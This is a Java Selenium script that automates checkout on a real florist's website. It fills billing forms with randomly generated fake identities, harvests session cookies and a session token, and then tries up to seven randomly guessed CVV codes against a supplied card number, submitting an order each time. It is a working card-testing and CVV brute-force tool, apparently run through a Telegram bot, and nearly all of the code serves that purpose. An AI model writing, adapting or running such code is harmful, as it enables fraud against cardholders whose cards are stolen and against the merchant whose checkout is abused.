package com.tammudu.files;
import java.util.*;
import com.tammudu.config.*;

import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.*;

import java.time.Duration;
import java.util.List;
import java.util.Random;

public class RealTimeSeleniumProcessor {
	public static String browserCookies = "";
	public static String dynSessionConf = "";

    private static WebDriver driver;
    private static WebDriverWait wait;
    private static final Random random = new Random();

    public static void preloadCheckoutPage(char firstDigit) {
        System.setProperty("webdriver.chrome.driver", "D:/MyPro1/telegrambot/drivers/chromedriver.exe");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--remote-allow-origins=*");
        driver = new ChromeDriver(options);
        wait = new WebDriverWait(driver, Duration.ofSeconds(15));

        try {
            driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10));
            driver.get("https://www.suzanns.com/");
//--------------------------------------page1-----------------------------------------------------------------
            // Step 1: Click random product
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector(".m-product-mini a.homePageEngagement")));
            List<WebElement> products = driver.findElements(By.cssSelector(".m-product-mini a.homePageEngagement"));
            if (products.isEmpty()) throw new RuntimeException("No products found on homepage.");
            WebElement randomProduct = products.get(random.nextInt(products.size()));
            randomProduct.click();
//-----------------------------------------page2--------------------------------------------------------------------
         // Step 2: Click "Pickup"
            WebElement pickupRadio = wait.until(ExpectedConditions.presenceOfElementLocated(By.id("pdpEfloristStorePickup")));
            ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", pickupRadio);
            wait.until(ExpectedConditions.elementToBeClickable(pickupRadio));
            ((JavascriptExecutor) driver).executeScript("arguments[0].click();", pickupRadio);
            Thread.sleep(4000);

         // Step 3: Click "Tomorrow" for pickup
            WebElement tomorrowLabel = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector("label[for='deliveryDate-ss-4']")));
            tomorrowLabel.click();
            // Optional short pause to simulate real user
            Thread.sleep(1000);

            // Step 4: Click Add to Cart
            WebElement addToCartBtn = wait.until(ExpectedConditions.presenceOfElementLocated(By.id("pdpAddToCartBtnDefault")));
            // Try clicking with JS
            try {
                ((JavascriptExecutor) driver).executeScript("arguments[0].click();", addToCartBtn);
            } catch (Exception e) {
                // Fallback to native click if JS fails
                wait.until(ExpectedConditions.elementToBeClickable(addToCartBtn)).click();
            }
   //----------------------------------------page 3---------------------------------------------------------------------------
 // Wait until Continue to Checkout button is clickable and click it
    WebElement continueBtn = wait.until(ExpectedConditions.elementToBeClickable(By.id("shoppingCartBtn2")));
    ((JavascriptExecutor) driver).executeScript("arguments[0].click();", continueBtn);
    
 // Step 6: Wait for the Card/Occasion Type select to be visible
    WebElement cardTypeSelect = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("select.giftCardOccasionType")));
    ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", cardTypeSelect);

    // Step 7: Select "No Card Message"
    Select cardDropdown = new Select(cardTypeSelect);
    cardDropdown.selectByVisibleText("No Card Message");

    // Step 8: Wait 1 second (to allow any dynamic scripts to finish)
    Thread.sleep(1000);

    // Step 9: Click the "Next: Billing & Review" button
    WebElement nextButton = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector("input.btn-submit.deliveryInfoBtn")));
    ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", nextButton);
    ((JavascriptExecutor) driver).executeScript("arguments[0].click();", nextButton);
    
 // Step: Wait for billing page to load
    wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("ccTypeDropDown")));

    // Step: Ask the user for the first digit of their card


    // Step: Select Payment Type based on first digit
    Select cardTypeDropdown = new Select(driver.findElement(By.id("ccTypeDropDown")));
    switch (firstDigit) {
        case '4': cardTypeDropdown.selectByValue("FDPYT1001"); break; // Visa
        case '5': cardTypeDropdown.selectByValue("FDPYT1002"); break; // MasterCard
        case '6': cardTypeDropdown.selectByValue("FDPYT1003"); break; // Discover
        case '3': cardTypeDropdown.selectByValue("FDPYT1007"); break; // Amex
        default: System.out.println("❌ Unsupported card type"); return;
    }

    // Step: Fill billing details with random data
    driver.findElement(By.id("first_name")).sendKeys(RandomBillingInfo.randomFirstName());
    driver.findElement(By.id("last_name")).sendKeys(RandomBillingInfo.randomLastName());
    driver.findElement(By.id("address1")).sendKeys(RandomBillingInfo.randomAddress());
    driver.findElement(By.id("city")).sendKeys(RandomBillingInfo.randomCity());
    driver.findElement(By.id("state")).sendKeys(RandomBillingInfo.randomStateCode());
    driver.findElement(By.id("zip")).sendKeys(RandomBillingInfo.randomZip());
    driver.findElement(By.id("phone_number")).sendKeys(RandomBillingInfo.randomPhone());
    driver.findElement(By.id("email")).sendKeys(RandomBillingInfo.randomEmail());

 // Extract and store _dynSessConf token
    String html = driver.getPageSource();
    dynSessionConf = org.jsoup.Jsoup.parse(html).select("input[name=_dynSessConf]").val();

    // Extract cookies into a single string
    Set<Cookie> cookies = driver.manage().getCookies();
    StringBuilder cookieBuilder = new StringBuilder();
    for (Cookie cookie : cookies) {
        cookieBuilder.append(cookie.getName()).append("=").append(cookie.getValue()).append("; ");
    }
    browserCookies = cookieBuilder.toString();

    // Final Step: Preload completed
    System.out.println("✅ Pre-Load is Ready");
} catch (Exception e) {
        driver.quit();
        throw new RuntimeException("❌ Preloading failed: " + e.getMessage());
    }
}
    public static String processFetsLuckCard(String cardNumber, String expMonth, String expYear, String userCVV) {
        try {
            WebDriverWait localWait = new WebDriverWait(driver, Duration.ofSeconds(10));
            JavascriptExecutor js = (JavascriptExecutor) driver;
            // Convert month/year
            String[] monthNames = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };
            int monthIndex = Integer.parseInt(expMonth) - 1;
            if (monthIndex < 0 || monthIndex > 11) return "❌ Invalid expiration month.";
            String monthName = monthNames[monthIndex];
            String fullYear = expYear.length() == 2 ? "20" + expYear : expYear;

            // Pre-locate stable elements
            WebElement ccNumber = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_number")));
            WebElement monthSelect = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_month")));
            WebElement yearSelect = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_year")));

            // Set static values
            ccNumber.clear();
            ccNumber.sendKeys(cardNumber);
            new Select(monthSelect).selectByVisibleText(monthName);
            new Select(yearSelect).selectByVisibleText(fullYear);

            // Use JS to avoid input delays
            for (int attempt = 1; attempt <= 7; attempt++) {
                String randomCVV = userCVV.length() == 4
                        ? String.valueOf(1000 + new Random().nextInt(9000))
                        : String.valueOf(100 + new Random().nextInt(900));
                try {
                    WebElement cvvField = driver.findElement(By.name("cvv_number"));
                    WebElement placeOrderBtn = driver.findElement(By.id("billingReviewBtnDefault"));

                    js.executeScript("arguments[0].value = arguments[1];", cvvField, randomCVV);
                    js.executeScript("arguments[0].click();", placeOrderBtn);

                } catch (StaleElementReferenceException e) {
                    attempt--;
                }
            }
            driver.quit();
            return "❌ 7 random CVV attempts failed. Card was declined.";
        } catch (Exception e) {
            return "❌ Error during fetsluck processing: " + e.getMessage();
        }
    }
}
